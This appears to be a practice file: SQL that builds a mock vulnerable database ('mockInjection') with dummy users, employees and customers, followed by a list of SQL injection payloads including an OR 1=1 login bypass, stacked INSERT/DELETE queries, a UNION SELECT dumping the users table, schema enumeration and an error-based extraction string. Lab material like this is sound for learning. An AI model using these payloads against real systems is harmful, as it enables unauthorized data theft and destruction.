//! initiate DB
DROP DATABASE IF EXISTS mockInjection;

CREATE DATABASE IF NOT EXISTS mockInjection;

USE mockInjection;
CREATE TABLE users(
	username varchar(255) NOT NULL,
	password varchar(255) NOT NULL
);
INSERT INTO users 
VALUES ('lnwza007', '123'), ('eiei123','123');

CREATE TABLE employee(
	employee_id varchar(255) NOT NULL,
    prefixname varchar(255) NOT NULL,
    fname varchar(255) NOT NULL,
    lname varchar(255) NOT NULL,
    nickname varchar(255) NOT NULL,
    email varchar(255) NOT NULL,
    tel char(10) NOT NULL,
    work_background varchar(255) NOT NULL,
    graduation_certificate varchar(255) NOT NULL,
    address varchar(255) NOT NULL,
    id_card varchar(255) NOT NULL,
    house_registration varchar(255) NOT NULL,
    PRIMARY KEY (employee_id)
);

INSERT INTO employee
VALUES ('E001', 'Mr.', 'bobo1', 'two1', 'baba1', 'E001@gmail.com', 0123456781 , 'companyA, companyB', 'XAU', '123 r.xxxxx 50200', 1530302340921, '123 r.xxxxx 54000'), 
       ('E002', 'Mr.', 'bobo2', 'two2', 'baba2', 'E002@gmail.com', 0123456782 , 'companyA, companyB', 'XAU', '123 r.xxxxx 50200', 1530302340922, '123 r.xxxxx 54000'), 
       ('E003', 'Mr.', 'bobo3', 'two3', 'baba3', 'E003@gmail.com', 0123456783 , 'companyA, companyB', 'XAU', '123 r.xxxxx 50200', 1530302340923, '123 r.xxxxx 54000'), 
       ('E004', 'Mr.', 'bobo4', 'two4', 'baba4', 'E004@gmail.com', 0123456784 , 'companyA, companyB', 'XAU', '123 r.xxxxx 50200', 1530302340924, '123 r.xxxxx 54000'), 
       ('E005', 'Mr.', 'bobo5', 'two5', 'baba5', 'E005@gmail.com', 0123456785 , 'companyA, companyB', 'XAU', '123 r.xxxxx 50200', 1530302340925, '123 r.xxxxx 54000');

CREATE TABLE customer(
	customer_id varchar(255) NOT NULL PRIMARY KEY,
    fname varchar(255) NULL,
    lname varchar(255) NULL,
    email varchar(255) NULL,
    tel char(10) NOT NULL
);

INSERT INTO customer
VALUES ('C001', 'memo1', 'one1', 'E001@gmail.com', 0123456781);

/////////////////////////////////////////////////////

"' OR 1=1 -- "

inject insert
A"; INSERT INTO service VALUES ("E", 500); -- A

inject delete
A"; DELETE FROM service WHERE name="E"; -- A

inject union
http://localhost:3000/service?name=A" UNION SELECT * FROM users; -- A

get all databases
A"; SHOW DATABASES; -- A

get all tables
A"; SHOW TABLES; -- A

A" or 1 = CONVERT(INT, (select top 1 name from sysobject where xtype=char(85))); -- A